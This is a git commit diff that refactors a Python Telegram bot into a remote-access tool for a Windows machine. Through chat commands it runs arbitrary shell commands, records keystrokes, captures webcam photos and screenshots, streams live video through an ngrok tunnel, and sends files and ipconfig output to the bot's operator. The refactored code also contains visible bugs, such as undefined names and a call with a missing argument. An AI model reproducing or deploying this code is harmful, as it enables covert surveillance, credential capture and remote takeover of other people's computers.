38ec376c3c368675666896f44322c55dca578ef8
nazeem2001 <nazeem1kadapa@gmail.com>
2022-11-07 20:31:00 +0530

    code refactoring

---
+++ features.py
@@ -0,0 +1,244 @@
+import live_webserver as lw
+import os
+from distutils import text_file
+from re import T
+from telepot.loop import MessageLoop
+from dotenv import load_dotenv
+
+import telepot
+import secrets
+import pyscreenshot
+import json
+from subprocess import run, Popen,PIPE
+from urllib import request as open_web
+import time
+import datetime
+import cv2
+from logger import Listener,key_handeler   
+import requests
+from pynput.keyboard import Controller as key
+import speech_recognition as sr
+import pyttsx3
+from pyngrok import ngrok
+class features:
+    def __init__(self ,telegram_bot):
+        load_dotenv()
+        self.admin_chat_id = os.getenv("ADMIN_CHAT_ID")  # chat_id of admin in int form
+        self.api_key = os.getenv("API_KEY")
+        self.admin_name = os.getenv("ADMIN_NAME")
+        self.ngrok_token = os.getenv("NGROK_TOKEN")
+        self.chat_id_file = 0
+        self.photo_name='photo.png'
+        self.authorzed_Users='authorzed_Users/authorzed_Users.json'
+        self.key_log_file="KeyLoger.txt"
+        self.fin = ''
+        self.random_f = ''
+        self.fname = ''
+        self.fileMessageId = ''
+        self.video_therad_state=''
+        self.random = 1
+        self.now = datetime.datetime.now()
+        self.authorized = 0
+        self.aut_chat_id = 0
+        self.pending = 0
+        self.logging = False
+        self.logger = 0
+        self.telegram_bot = telegram_bot
+        file_found = False
+        while not file_found:
+            try:
+                with open(self.authorzed_Users) as f:
+                    self.auth_list = json.load(f)
+                print(self.auth_list)
+                file_found = True
+            except FileNotFoundError:
+                data = {'authorized': [{'chat_id': None, 'Name': None}]}
+                with open(features.authorzed_Users, 'w') as f:
+                    json.dump(data, f, indent=2)
+
+    def test_message(self):
+        i = 2
+        while (i > 0):
+            messag = Popen('ipconfig', shell=True, stdout=PIPE,
+                        text=True).communicate()[0]
+            self.telegram_bot.sendMessage(self.admin_chat_id, messag)
+            i = i - 1
+    
+    def send(self,fp ,chat_id):
+        self.telegram_bot.sendDocument(chat_id, open(fp, 'rb'))
+
+    def live_video(self,chat_id):
+    
+        if self.video_therad_state=="ON":
+            lw.stop_server()
+            ngrok.kill()
+            self.telegram_bot.sendMessage(chat_id,"video feed ended")
+            self.video_therad_state=""
+        else:
+            lw.start_server()
+            tunnel=ngrok.connect(5000,'http')
+            public_url= str(tunnel).split('''"''')[1]
+            self.telegram_bot.sendMessage(chat_id,f'''for live video feed vist 
+    {public_url}''')
+            if not(str(chat_id).startswith(self.admin_chat_id) and str(chat_id).endswith(self.admin_chat_id)): 
+                self.telegram_bot.sendMessage(self.admin_chat_id,f'''live video feed started by {self.first_name} {last_name} vist 
+    {public_url}''')
+            self.video_therad_state="ON"
+    def download_file(self,msg, key):
+        key_list = ["text", "voice", "photo", "video", "document"]
+        chat_id = msg['chat']['id']
+        self.fileMessageId = msg['message_id']
+        print(self.fileMessageId)
+        self.chat_id_file = chat_id
+        authorized = False
+        if self.pending == 0 or chat_id != self.aut_chat_id:
+            for i in self.auth_list['authorized']:
+                if i['chat_id'] == chat_id:
+                    authorized = True
+                    break
+        if authorized:
+            if key == key_list[4]:
+                fname = msg[key]["file_name"]
+            if key == "photo":
+                fid = msg[key][3]["file_id"]
+            else:
+                fid = msg[key]["file_id"]
+            resp = requests.get(
+                url=f"https://api.telegram.org/bot{self.api_key}/getFile?file_id={fid}")
+            resp = resp.json()
+            fp = resp["result"]["file_path"]
+            if key != key_list[4]:
+                fname = fp[fp.index('/')+1:]
+            self.fin = requests.get(
+                url=f"https://api.telegram.org/file/bot{self.api_key}/{fp}", allow_redirects=True)
+            if not(str(chat_id).startswith(self.admin_chat_id) and str(chat_id).endswith(self.admin_chat_id)):
+                if fname.endswith(".oga"):
+                    with open(f'downloads/{fname}', "wb") as f:
+                        f.write(self.fin.content)  
+                    self.recognise_speech_and_do(msg,fname)
+                else:
+                    print(self.admin_chat_id)
+                    random_f = str(secrets.token_hex(32)).upper()
+                    self.telegram_bot.sendMessage(
+                        chat_id, f'{self.admin_name} will tell you the authorization code')
+                    self.telegram_bot.sendMessage(
+                        self.admin_chat_id, f"do you want to recive {key} send a key to { msg['chat']['first_name']} {msg['chat']['last_name']} of ")
+                    self.telegram_bot.sendMessage(self.admin_chat_id, random_f)
+            else:
+                with open(f'downloads/{fname}', "wb") as f:
+                    f.write(self.fin.content)    
+                if fname.endswith(".oga"):
+                    self.recognise_speech_and_do(msg,fname)  
+                self.chat_id_file = 0
+                self.fin = ""
+                self.telegram_bot.sendMessage(chat_id, f'file saved as {fname}')
+                fname = ""
+                
+                self.fileMessageId = "aa"
+
+    def recognise_speech_and_do(self,msg,fname):
+        
+        convert_command=f'C:/tweakes/bin/ffmpeg -y -i downloads/{fname} downloads/{fname}.wav'
+        print(convert_command)
+        message = Popen(convert_command, shell=True,
+                            stdout=PIPE, text=True).communicate()[0]
+        text=""
+        print(message)
+        speach=sr.Recognizer() 
+        try:
+            with sr.AudioFile(f"downloads/{fname}.wav") as source:
+                # listen for the data (load audio to memory)
+                audio_data = speach.record(source)
+                # recognize (convert from speech to text)
+                
+                text = speach.recognize_google(audio_data)
+        except sr.UnknownValueError:
+            self.telegram_bot.sendMessage(chat_id,f"Didn't get what you said")
+            source.close()
+            os.remove(f"downloads/{fname}.wav")
+            os.remove(f"downloads/{fname}")
+            print('deleted')
+            return
+        os.remove(f"downloads/{fname}.wav")
+        os.remove(f"downloads/{fname}")
+        print('deleted')
+        print(text)
+        chat_id = msg['chat']['id']
+        self.telegram_bot.sendMessage(chat_id,f'you said {text}')
+        first_name = msg['chat']['first_name']
+        last_name = msg['chat']['last_name']
+        self.chat_id_file = 0
+        self.fin = ""
+        fname = ""
+        self.fileMessageId = "aa"
+        replymessage(first_name, last_name, text, chat_id)
+    def speak(self ,command):
+        speak = pyttsx3.init()
+        list_command= command.split()
+        x = len(list_command[0])
+        speak.say(command[x:])
+        speak.runAndWait()
+    def save_file_in_fin(self,chat_id,fname):
+        with open(f'downloads/{fname}', "wb") as f:
+            f.write(self.fin.content)
+        self.chat_id_file = 0
+        self.fin = ""
+        self.telegram_bot.sendMessage(chat_id, f'file saved as {fname}')
+        fname = ""
+        fileMessageId = "aa"
+    def take_screenshot(self ,chat_id):
+        print("scr")
+        img = pyscreenshot.grab()
+        img.save('screen.png')
+        self.telegram_bot.sendPhoto(chat_id, photo=open("screen.png", 'rb'))
+        os.remove("screen.png")
+    def kill_task(self, chat_id,list_command):
+        command = f'''Taskkill /f /Im "{list_command[1]}.exe" /t'''
+        if len(list_command) == 2:
+            message = Popen(command, shell=True,
+                            stdout=PIPE, text=True).communicate()[0]
+        else:
+            message = 'Invalid command'
+        self.telegram_bot.sendMessage(chat_id, message)
+    def keyboard_type(self,command):
+        keyboard = key()
+        list_command= command.split()
+        x = len(list_command[0])
+        keyboard.type(command[x+1:])
+    def take_photo(self ,chat_id):
+        vod = cv2.VideoCapture(0)
+        d, img = vod.read()
+        vod.release()
+        cv2.imwrite(self.photo_name, img)
+        self.telegram_bot.sendPhoto(chat_id, photo=open(self.photo_name, 'rb'))
+        os.remove(self.photo_name)
+    def key_logger(self,chat_id):
+        if not self.logging:
+            self.logger = Listener(on_press=key_handeler)
+            self.logger.start()
+            self.telegram_bot.sendMessage(chat_id, "Key logger stared")
+            self.logging = True
+        else:
+            self.logger.stop()
+            self.telegram_bot.sendMessage(chat_id, "Key logger stopped")
+            self.telegram_bot.sendDocument(
+                chat_id, document=open(self.key_log_file, "rb"))
+            x = open(self.key_log_file, "w")
+            x.close()
+            os.remove(self.key_log_file)
+            self.logging = False
+    def send_first_auth_code(self,chat_id,name):
+        self.random = str(secrets.token_hex(6)).upper()
+        print(self.random, type(self.random))
+
+        self.telegram_bot.sendMessage(self.admin_chat_id, self.random)
+        self.telegram_bot.sendMessage(self.admin_chat_id, str(
+            'do you want to authorize ' + name))
+
+        self.telegram_bot.sendMessage(
+            chat_id, f'you are not a authorized user please contact {self.admin_name}')
+        self.telegram_bot.sendMessage(
+            chat_id, 'He will tell you the authorization code')
+        self.aut_chat_id = chat_id
+        self.pending = 1
+        print(self.pending, self.aut_chat_id)
--- main.py
+++ main.py
@@ -14,119 +14,53 @@ import datetime
 import os
 import cv2
 from logger import Listener,key_handeler   
-import app
+import live_webserver
 import requests
 from pynput.keyboard import Controller as key
 import speech_recognition as sr
 import pyttsx3
 from pyngrok import ngrok
+import features
 load_dotenv()
-admin_chat_id = os.getenv("ADMIN_CHAT_ID")  # chat_id of admin in int form
-admin_name = os.getenv("ADMIN_NAME")
 api_key = os.getenv("API_KEY")
-ngrok_token = os.getenv("NGROK_TOKEN")
-print(admin_chat_id, api_key, admin_name)
-chat_id_file = 0
-photo_name='photo.png'
-authorzed_Users='authorzed_Users/authorzed_Users.json'
-key_log_file="KeyLoger.txt"
-fin = ''
-random_f = ''
-fname = ''
-fileMessageId = ''
-video_therad_state=''
-ngrok.set_auth_token(ngrok_token)
+telegram_bot = telepot.Bot(api_key)
+feature =features.features(telegram_bot)
+
+telegram_bot = telepot.Bot(api_key)
 def replymessage(first_name, last_name, command, chat_id):
-    global auth_list, random, authorized, aut_chat_id, pending, logging, logger, key_list, chat_id_file, fin, fname, fileMessageId,video_therad,video_therad_state
+   
     name = f'{first_name} {last_name}'
     print(name)
     print('Received:', command, 'chat_id', chat_id)
     authorized = False
-    print(random)
-    if pending == 0 or chat_id != aut_chat_id:
-        for i in auth_list['authorized']:
+    print(feature.random)
+    if feature.pending == 0 or chat_id != feature.aut_chat_id:
+        for i in feature.auth_list['authorized']:
             if i['chat_id'] == chat_id:
                 authorized = True
                 break
         if authorized:
             list_command = command.split()
             if list_command[0] == "Send" or list_command[0] == "send":
-                if chat_id == admin_chat_id:
+                if chat_id == feature.admin_chat_id:
                     x = len(list_command[0])
-                    telegram_bot.sendDocument(
-                        chat_id, open(command[x+1:], 'rb'))
+                    feature.send(command[x+1:],chat_id)
             elif list_command[0] == "video" or list_command[0] == "Video":
-               if video_therad_state=="ON":
-                   app.stop_server()
-                   ngrok.kill()
-                   telegram_bot.sendMessage(chat_id,"video feed ended")
-                   video_therad_state=""
-               else:
-                   app.start_server()
-                   tunnel=ngrok.connect(5000,'http')
-                   public_url= str(tunnel).split('''"''')[1]
-                   telegram_bot.sendMessage(chat_id,f'''for live video feed vist 
-{public_url}''')
-                   if not(str(chat_id).startswith(admin_chat_id) and str(chat_id).endswith(admin_chat_id)):
-                       telegram_bot.sendMessage(admin_chat_id,f'''live video feed started by {first_name} {last_name} vist 
-{public_url}''')
-                   video_therad_state="ON"
-
-                   
+               feature.live_video(chat_id)
             elif list_command[0] == "types" or list_command[0] == "Types":
-                keyboard = key()
-                x = len(list_command[0])
-                keyboard.type(command[x+1:])
+                feature.keyboard_type(command)
             elif list_command[0] == "Speak" or list_command[0] == "speak":
-                speak = pyttsx3.init()
-                x = len(list_command[0])
-                speak.say(command[x:])
-                speak.runAndWait()
-            elif chat_id == chat_id_file and list_command[0] == random_f:
-                with open(f'downloads/{fname}', "wb") as f:
-                    f.write(fin.content)
-                chat_id_file = 0
-                fin = ""
-                telegram_bot.sendMessage(chat_id, f'file saved as {fname}')
-                fname = ""
-                fileMessageId = "aa"
-
+                feature.speak(command)
+            elif chat_id == feature.chat_id_file and list_command[0] == feature.random_f:
+                feature.save_file_in_fin(chat_id)
             elif ((list_command[0] == "screenshot") | (list_command[0] == "Screenshot")):
-                print("scr")
-                img = pyscreenshot.grab()
-                img.save('screen.png')
-                telegram_bot.sendPhoto(chat_id, photo=open("screen.png", 'rb'))
-                os.remove("screen.png")
+               feature.take_screenshot(chat_id)
             elif((list_command[0] == "stop") | (list_command[0] == "Stop")):
-                command = f'''Taskkill /f /Im "{list_command[1]}.exe" /t'''
-                if len(list_command) == 2:
-                    message = Popen(command, shell=True,
-                                    stdout=PIPE, text=True).communicate()[0]
-                else:
-                    message = 'Invalid command'
-                telegram_bot.sendMessage(chat_id, message)
+                feature.kill_task(chat_id,list_command)
             elif((list_command[0] == "photo") | (list_command[0] == "Photo")):
-                vod = cv2.VideoCapture(0)
-                d, img = vod.read()
-                vod.release()
-                cv2.imwrite(photo_name, img)
-                telegram_bot.sendPhoto(chat_id, photo=open(photo_name, 'rb'))
-                os.remove(photo_name)
+                feature.take_photo(chat_id)
             elif((list_command[0] == "keylog") | (list_command[0] == "Keylog")):
-                if not logging:
-                    logger = Listener(on_press=key_handeler)
-                    logger.start()
-                    telegram_bot.sendMessage(chat_id, "Key logger stared")
-                    logging = True
-                else:
-                    logger.stop()
-                    telegram_bot.sendMessage(chat_id, "Key logger stopped")
-                    telegram_bot.sendDocument(
-                        chat_id, document=open(key_log_file, "rb"))
-                    x = open(key_log_file, "w")
-                    x.close()
-                    os.remove(key_log_file)
-                    logging = False
+                feature.key_logger(chat_id)
             else:
                 message = Popen(command, shell=True, stdout=PIPE,
                                 text=True).communicate()[0]
@@ -134,164 +68,27 @@ def replymessage(first_name, last_name, command, chat_id):
                     chat_id, "INVALID Command"if message == "" else message)
 
         else:
-            random = str(secrets.token_hex(6)).upper()
-            print(random, type(random))
-
-            telegram_bot.sendMessage(admin_chat_id, random)
-            telegram_bot.sendMessage(admin_chat_id, str(
-                'do you want to authorize ' + name))
-
-            telegram_bot.sendMessage(
-                chat_id, f'you are not a authorized user please contact {admin_name}')
-            telegram_bot.sendMessage(
-                chat_id, 'He will tell you the authorization code')
-            aut_chat_id = chat_id
-            pending = 1
-            print(pending, aut_chat_id)
+            feature.send_first_auth_code(chat_id,name)
     else:
-        print(random)
-        if command == random:
+        print(feature.random)
+        if command == feature.random:
             telegram_bot.sendMessage(
                 chat_id, str('you are authorized ' + name))
             new_guy = {'chat_id': chat_id, 'Name': name}
             print(new_guy)
-            auth_list['authorized'].append(new_guy)
-            print(auth_list)
-            pending = 0
-            with open(authorzed_Users, 'w') as f:
-                json.dump(auth_list, f, indent=2)
+            feature.auth_list['authorized'].append(new_guy)
+            print(feature.auth_list)
+            feature.pending = 0
+            with open(feature.authorzed_Users, 'w') as f:
+                json.dump(feature.auth_list, f, indent=2)
                 f.close()
         else:
             telegram_bot.sendMessage(chat_id, 'sorry invalid code')
 
 
-def download_file(msg, key):
-    global fin, fname, pending, random_f, chat_id_file, fileMessageId, admin_chat_id
-    chat_id = msg['chat']['id']
-    fileMessageId = msg['message_id']
-    print(fileMessageId)
-    chat_id_file = chat_id
-    authorized = False
-    if pending == 0 or chat_id != aut_chat_id:
-        for i in auth_list['authorized']:
-            if i['chat_id'] == chat_id:
-                authorized = True
-                break
-    if authorized:
-        if key == key_list[4]:
-            fname = msg[key]["file_name"]
-        if key == "photo":
-            fid = msg[key][3]["file_id"]
-        else:
-            fid = msg[key]["file_id"]
-        resp = requests.get(
-            url=f"https://api.telegram.org/bot{api_key}/getFile?file_id={fid}")
-        resp = resp.json()
-        fp = resp["result"]["file_path"]
-        if key != key_list[4]:
-            fname = fp[fp.index('/')+1:]
-        fin = requests.get(
-            url=f"https://api.telegram.org/file/bot{api_key}/{fp}", allow_redirects=True)
-        if not(str(chat_id).startswith(admin_chat_id) and str(chat_id).endswith(admin_chat_id)):
-            if fname.endswith(".oga"):
-                with open(f'downloads/{fname}', "wb") as f:
-                    f.write(fin.content)
-                convert_command=f'C:/tweakes/bin/ffmpeg -y -i downloads/{fname} downloads/{fname}.wav'
-                print(convert_command)
-                message = Popen(convert_command, shell=True,
-                                    stdout=PIPE, text=True).communicate()[0]
-                text=""
-                print(message)
-                speach=sr.Recognizer() 
-                try:
-                    with sr.AudioFile(f"downloads/{fname}.wav") as source:
-                        # listen for the data (load audio to memory)
-                        audio_data = speach.record(source)
-                        # recognize (convert from speech to text)
-                        
-                        text = speach.recognize_google(audio_data)
-                except sr.UnknownValueError:
-                    telegram_bot.sendMessage(chat_id,f"Didn't get what you said")
-                    source.close()
-                    os.remove(f"downloads/{fname}.wav")
-                    os.remove(f"downloads/{fname}")
-                    print('deleted')
-                    return
-                os.remove(f"downloads/{fname}.wav")
-                os.remove(f"downloads/{fname}")
-                print('deleted')
-                print(text)
-                telegram_bot.sendMessage(chat_id,f'you said {text}')
-                chat_id = msg['chat']['id']
-                first_name = msg['chat']['first_name']
-                last_name = msg['chat']['last_name']
-                chat_id_file = 0
-                fin = ""
-                fname = ""
-                fileMessageId = "aa"
-                replymessage(first_name, last_name, text, chat_id)
-            else:
-                print(admin_chat_id)
-                random_f = str(secrets.token_hex(32)).upper()
-                telegram_bot.sendMessage(
-                    chat_id, f'{admin_name} will tell you the authorization code')
-                telegram_bot.sendMessage(
-                    admin_chat_id, f"do you want to recive {key} send a key to { msg['chat']['first_name']} {msg['chat']['last_name']} of ")
-                telegram_bot.sendMessage(admin_chat_id, random_f)
-        else:
-            with open(f'downloads/{fname}', "wb") as f:
-                f.write(fin.content)
-            if fname.endswith(".oga"):
-                convert_command=f'C:/tweakes/bin/ffmpeg -y -i downloads/{fname} downloads/{fname}.wav'
-                print(convert_command)
-                message = Popen(convert_command, shell=True,
-                                    stdout=PIPE, text=True).communicate()[0]
-                text=""
-                print(message)
-                speach=sr.Recognizer() 
-                try:
-                    with sr.AudioFile(f"downloads/{fname}.wav") as source:
-                        # listen for the data (load audio to memory)
-                        audio_data = speach.record(source)
-                        # recognize (convert from speech to text)
-                    
-                        text = speach.recognize_google(audio_data)
-                except sr.UnknownValueError:
-                    telegram_bot.sendMessage(chat_id,f"Didn't get what you said")
-                    os.remove(f"downloads/{fname}.wav")
-                    os.remove(f"downloads/{fname}")
-                    print('deleted')
-                    return
-                os.remove(f"downloads/{fname}.wav")
-                os.remove(f"downloads/{fname}")
-                print('deleted')
-                print(text)
-                telegram_bot.sendMessage(chat_id,f'you said {text}')
-                chat_id = msg['chat']['id']
-                first_name = msg['chat']['first_name']
-                last_name = msg['chat']['last_name']
-                replymessage(first_name, last_name, text, chat_id)
-                
-            chat_id_file = 0
-            fin = ""
-            telegram_bot.sendMessage(chat_id, f'file saved as {fname}')
-            fname = ""
-            
-            fileMessageId = "aa"
 
 
 key_list = ["text", "voice", "photo", "video", "document"]
-file_found = False
-while not file_found:
-    try:
-        with open(authorzed_Users) as f:
-            auth_list = json.load(f)
-        print(auth_list)
-        file_found = True
-    except FileNotFoundError:
-        data = {'authorized': [{'chat_id': None, 'Name': None}]}
-        with open(authorzed_Users, 'w') as f:
-            json.dump(data, f, indent=2)
 
 connected = False
 while (connected == False):
@@ -301,31 +98,14 @@ while (connected == False):
     except Exception:
         connected = False
         time.sleep(1)
-print(auth_list)
-
-random = 1
-now = datetime.datetime.now()
-authorized = 0
-aut_chat_id = 0
-pending = 0
-logging = False
-logger = 0
+print(feature.auth_list)
 
 
-def test_message():
-    i = 2
-    while (i > 0):
-        messag = Popen('ipconfig', shell=True, stdout=PIPE,
-                       text=True).communicate()[0]
-     #  print(messag)
-        telegram_bot.sendMessage(admin_chat_id, messag)
-       # time.sleep(5)
-        i = i - 1
 
 
 def action(msg):
-    global auth_list, random, authorized, aut_chat_id, pending, logging, logger, key_list
-    print(auth_list)
+    
+    print(feature.auth_list)
 
     chat_id = msg['chat']['id']
     first_name = msg['chat']['first_name']
@@ -339,11 +119,11 @@ def action(msg):
     if key == "text":
         replymessage(first_name, last_name, command, chat_id)
     if key in key_list[1:]:
-        download_file(msg, key)
+        feature.download_file(msg, key)
 
 
-telegram_bot = telepot.Bot(api_key)
-test_message()
+
+feature.test_message()
 
 print(telegram_bot.getMe())  # for internal testing
 MessageLoop(telegram_bot, action).run_as_thread()
